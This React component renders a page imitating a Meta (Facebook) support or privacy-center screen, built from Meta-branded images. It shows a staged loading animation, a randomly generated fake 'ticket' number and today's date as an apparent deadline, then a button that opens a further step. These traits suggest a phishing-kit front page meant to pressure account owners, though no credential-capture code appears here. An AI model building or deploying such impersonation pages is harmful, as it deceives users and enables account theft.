import React, { useEffect } from 'react'
import moment from 'moment';
import { useTranslation } from 'react-i18next';
import "@/app/libs/i18n"

interface MetaProps {
    onToggle: (value: boolean) => void;
}

const MetaComponent = ({ onToggle }: MetaProps) => {

    const currentDate = moment().format('MMMM D, YYYY')
    const [ticketId, setTicketId] = React.useState("4564-ATFD-4865");
    const [isImageLoaded, setIsImageLoaded] = React.useState(false);
    
    const { t } = useTranslation();

    useEffect(() => {
        const generateTicketId = () => {
            const section1 = Math.random().toString(36).substring(2, 6).toUpperCase();
            const section2 = Math.random().toString(36).substring(2, 6).toUpperCase();
            const section3 = Math.random().toString(36).substring(2, 6).toUpperCase();
            setTicketId(`${section1}-${section2}-${section3}`);
        };

        generateTicketId();

    }, []);

    useEffect(() => {
        setTimeout(() => {
            setIsImageLoaded(true)
        }, 3200);
    }, [])

    return (
        <>
            {
                !isImageLoaded ? (
                    <div className='logo-loading'>
                        <img src="/images/meta/loading-logo.gif" alt="loading" className='loading-img' />
                    </div>
                ) : (
                    <>
                        <div className="bg-[linear-gradient(130deg,_rgba(249,241,249,1)_0%,_rgba(234,243,253,1)_35%,_rgba(237,251,242,1)_100%)] h-screen overflow-hidden overflow-y-scroll">
                            <div className="max-w-[1100px] mx-auto flex flex-wrap">
                                <div className="w-full md:w-4/12 border-r border-[#dadde1]">
                                    <div className="sticky top-0 md:h-screen pt-7 pr-8 pb-0 md:pl-5 pl-[10px] md:pr-[30px]">
                                        <div className="logo w-[60px]">
                                            <img src="/images/meta/logo.svg" width="100%" alt="" />
                                        </div >
                                        <div className="hidden md:block">
                                            <h1 className="text-[24px] text-[#0A1317] font-[600]">{t('menu.title')}</h1>
                                            <div className="pt-[15px]">
                                                <div className="flex items-center w-full pt-[12px] pb-[12px] px-[16px] gap-[12px] rounded-[15px] overflow-hidden cursor-pointer hover:bg-white">
                                                    <div className="icon w-[24px] h-[24px]">
                                                        <img src="/images/meta/home.svg" width="100%" />
                                                    </div>
                                                    <div className="text text-[#0A1317] text-[15px] font-[600]">
                                                        <p>{t('menu.menu_1.title')}</p>
                                                    </div>
                                                </div>
                                                <div className="flex items-center w-full pt-[12px] pb-[12px] px-[16px] gap-[12px] rounded-[15px] overflow-hidden cursor-pointer hover:bg-white">
                                                    <div className="icon w-[24px] h-[24px]">
                                                        <img src="/images/meta/search.svg" width="100%" />
                                                    </div>
                                                    <div className="text text-[#0A1317] text-[15px] font-[600]">
                                                        <p>{t('menu.menu_2.title')}</p>
                                                    </div>
                                                </div>
                                                <div className="flex items-center w-full pt-[12px] pb-[12px] px-[16px] gap-[12px] bg-[#354855] rounded-[15px] overflow-hidden cursor-pointer">
                                                    <div className="icon w-[24px] h-[24px]">
                                                        <img src="/images/meta/tool.svg" width="100%" />
                                                    </div>
                                                    <div className="text text-[white] text-[15px] font-[500]">
                                                        <p> {t('menu.menu_3.title')}</p>
                                                    </div>
                                                </div>
                                                <div className="flex items-center w-full pt-[12px] pb-[12px] px-[16px] gap-[12px] rounded-[15px] overflow-hidden cursor-pointer hover:bg-white">
                                                    <div className="icon w-[24px] h-[24px]">
                                                        <img src="/images/meta/client.svg" width="100%" />
                                                    </div>
                                                    <div className="text text-[#0A1317] text-[15px] font-[600]">
                                                        <p>{t('menu.menu_4.title')}</p>
                                                    </div>
                                                </div>
                                                <div className="flex items-center w-full pt-[12px] pb-[12px] px-[16px] gap-[12px] rounded-[15px] overflow-hidden cursor-pointer hover:bg-white">
                                                    <div className="icon w-[24px] h-[24px]">
                                                        <img src="/images/meta/black.svg" width="100%" />
                                                    </div>
                                                    <div className="text text-[#0A1317] text-[15px] font-[600]">
                                                        <p>{t('menu.menu_5.title')}</p>
                                                    </div>
                                                </div>
                                                <div className="flex items-center w-full pt-[12px] pb-[12px] px-[16px] rounded-[15px] overflow-hidden cursor-pointer justify-between hover:bg-white">
                                                    <div className="icon w-[24px] h-[24px]">
                                                        <img src="/images/meta/lock.svg" width="100%" />
                                                    </div>
                                                    <div className="text text-[#0A1317] text-[15px] pl-[12px] pr-[12px] w-[calc(100%-44px)] font-[600]">
                                                        <p>{t('menu.menu_6.title')}</p>
                                                    </div>
                                                    <div className="arrow w-[20px] h-[20px]">
                                                        <img src="/images/meta/arrow.svg" width="100%" />
                                                    </div>
                                                </div>
                                                <div className="flex items-center w-full pt-[12px] pb-[12px] px-[16px] rounded-[15px] overflow-hidden cursor-pointer justify-between hover:bg-white">
                                                    <div className="icon w-[24px] h-[24px]">
                                                        <img src="/images/meta/more.svg" width="100%" />
                                                    </div>
                                                    <div className="text text-[#0A1317] text-[15px] pl-[12px] pr-[12px] w-[calc(100%-44px)] font-[600]">
                                                        <p>{t('menu.menu_7.title')}</p>
                                                    </div>
                                                    <div className="arrow w-[20px] h-[20px]">
                                                        <img src="/images/meta/arrow.svg" width="100%" />
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div >
                                </div >

                                <div className="w-full md:w-8/12">
                                    <div className=" pt-[20px] md:pt-[40px] pr-0 pb-0 md:pl-[30px] pl-[10px] pr-[10px]">
                                        <div className="w-full">
                                            <h1 className="text-[24px] font-bold text-[#0A1317] mb-[10px]">
                                                {t('content.top_content.title')}
                                            </h1>
                                            <p className="text-[15px] mb-[5px]">
                                                {t('content.top_content.sub.sub_1')}
                                            </p>
                                            <p className="text-[15px] mb-[5px]">
                                                {t('content.top_content.sub.sub_2')}
                                            </p>
                                            <p className="text-[15px] mb-[15px] text-[#465a69]">
                                                {t('content.top_content.ticket')} #{ticketId}
                                            </p>
                                            <div className="w-full">
                                                <p className="text-[15px] mb-[5px]">
                                                    <b>
                                                        {t('content.guide.title')}
                                                    </b>
                                                </p>
                                                <ul className="list-disc pl-[20px]">
                                                    <li className="text-[15px] mb-[5px]">
                                                        {t('content.guide.sub.sub_1')}
                                                    </li>
                                                    <li className="text-[15px] mb-[5px]">
                                                        {t('content.guide.sub.sub_2')}
                                                    </li>
                                                    <li className="text-[15px] mb-[5px]">
                                                        {t('content.guide.sub.sub_3')}
                                                    </li>
                                                </ul>
                                            </div>
                                        </div>
                                        <div className="w-full mt-[30px] mb-[30px] rounded-[15px] overflow-hidden bg-[#d2d2fe] p-[16px]">
                                            <img src="/images/meta/banner.png" width="100%" alt="" />
                                            <div className="w-full bg-[white] p-[16px] rounded-[15px]">
                                                <p className="mb-[5px] text-[15px]">
                                                    {t('content.thumb.sub.sub_1')}
                                                </p>
                                                <p className="mb-[5px] text-[16px]">
                                                    <b>{t('content.thumb.title')}</b>
                                                </p>
                                                <p className='text-[15px]'>
                                                    {t('content.thumb.sub.sub_2')}
                                                </p>
                                            </div>
                                            <div onClick={() => onToggle(true)} className="w-full mt-[20px] bg-[#0064E0] rounded-[40px] pt-[10px] pb-[10px] flex items-center justify-center cursor-pointer">
                                                <p className="text-[white] text-[15px] font-[600]">
                                                    {t('content.thumb.button')}
                                                </p>
                                            </div>
                                            <div className="w-full text-center mt-[15px]">
                                                <p className="text-[14px]">{t('content.thumb.day')} <b>{currentDate}</b>.</p>
                                            </div>
                                        </div>
                                        <div className="w-full mt-[30px]">
                                            <p className="text-[15px] text-[#0A1317] font-[500]">{t('content.privacy_center.title')}</p>
                                            <div className="flex items-center gap-[10px] bg-[white] py-[12px] px-[16px] rounded-t-[16px] overflow-hidden cursor-pointer border-b border-[#E3E8EF]">
                                                <div className="w-[40px] h-[40px]">
                                                    <img src="/images/meta/women.png" width="100%" alt="" />
                                                </div>
                                                <div className="w-[calc(100%-68px)]">
                                                    <p className='text-[15px]'>{t('content.privacy_center.sub_title.sub_1.title')}</p>
                                                    <p className="text-[#465a69] font-[300] text-[13px]">{t('content.privacy_center.sub_title.sub_1.description')}</p>
                                                </div>
                                                <div className="arrow w-[18px] h-[18px]">
                                                    <img src="/images/meta/arrow.svg" width="100%" />
                                                </div>
                                            </div>
                                            <div className="flex items-center gap-[10px] bg-[white] py-[12px] px-[16px] rounded-b-[16px] overflow-hidden cursor-pointer">
                                                <div className="w-[40px] h-[40px]">
                                                    <img src="/images/meta/women.png" width="100%" alt="" />
                                                </div>
                                                <div className="w-[calc(100%-68px)]">
                                                    <p className='text-[15px]'>{t('content.privacy_center.sub_title.sub_2.title')}</p>
                                                    <p className="text-[#465a69] font-[300] text-[13px]">{t('content.privacy_center.sub_title.sub_1.description')}</p>
                                                </div>
                                                <div className="arrow w-[18px] h-[18px]">
                                                    <img src="/images/meta/arrow.svg" width="100%" />
                                                </div>
                                            </div>
                                            <br />
                                            <p className="text-[15px] text-[#0A1317] font-[500]">{t('content.more_info.title')}</p>
                                            <div className="flex items-center gap-[10px] bg-[white] py-[12px] px-[16px] rounded-[16px] overflow-hidden cursor-pointer border-b border-[#E3E8EF]">
                                                <div className="w-[40px] h-[40px]">
                                                    <img src="/images/meta/docs.png" width="100%" alt="" />
                                                </div>
                                                <div className="w-[calc(100%-68px)]">
                                                    <p className='text-[15px]'>{t('content.more_info.sub_title.sub_1.title')}</p>
                                                    <p className="text-[#465a69] font-[300] text-[13px]">{t('content.more_info.sub_title.sub_1.description')}</p>
                                                </div>
                                                <div className="arrow w-[18px] h-[18px]">
                                                    <img src="/images/meta/arrow.svg" width="100%" />
                                                </div>
                                            </div>
                                            <br />
                                            <p className="text-[15px] text-[#0A1317] font-[500]">{t('content.resouces.title')}</p>
                                            <div className="flex items-center gap-[10px] bg-[white] py-[12px] px-[16px] rounded-t-[16px] overflow-hidden cursor-pointer border-b border-[#E3E8EF]">
                                                <div className="w-[calc(100%-18px)]">
                                                    <p className='text-[15px]'>{t('content.resouces.sub_title.sub_1.title')}</p>
                                                    <p className="text-[#465a69] font-[300] text-[13px]">{t('content.resouces.sub_title.sub_1.description')}</p>
                                                </div>
                                                <div className="arrow w-[18px] h-[18px]">
                                                    <img src="/images/meta/arrow.svg" width="100%" />
                                                </div>
                                            </div>
                                            <div className="flex items-center gap-[10px] bg-[white] py-[12px] px-[16px] overflow-hidden cursor-pointer border-b border-[#E3E8EF]">
                                                <div className="w-[calc(100%-18px)]">
                                                    <p className='text-[15px]'>{t('content.resouces.sub_title.sub_2.title')}</p>
                                                    <p className="text-[#465a69] font-[300] text-[13px]">{t('content.resouces.sub_title.sub_2.description')}</p>
                                                </div>
                                                <div className="arrow w-[18px] h-[18px]">
                                                    <img src="/images/meta/arrow.svg" width="100%" />
                                                </div>
                                            </div>
                                            <div className="flex items-center gap-[10px] bg-[white] py-[12px] px-[16px] rounded-b-[16px] overflow-hidden cursor-pointer border-b border-[#E3E8EF]">
                                                <div className="w-[calc(100%-18px)]">
                                                    <p className='text-[15px]'>{t('content.resouces.sub_title.sub_3.title')}</p>
                                                    <p className="text-[#465a69] font-[300] text-[13px]">{t('content.resouces.sub_title.sub_3.description')}</p>
                                                </div>
                                                <div className="arrow w-[18px] h-[18px]">
                                                    <img src="/images/meta/arrow.svg" width="100%" />
                                                </div>
                                            </div>
                                            <div className="w-full mt-[20px] mb-[10px]">
                                                <p className="text-[#465a69] text-[14px] font-[300]">{t('content.footer.title')} <a className="text-[#0d6efd] inline items-center gap-[5px] " href="">{t('content.footer.link')} <img src="/images/meta/reject.svg" className="w-[10px] h-[10px] mb-[2px] items-center inline" alt="" /></a></p>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div >
                        </div >
                    </>
                )
            }
        </>
    )
}

export default MetaComponent
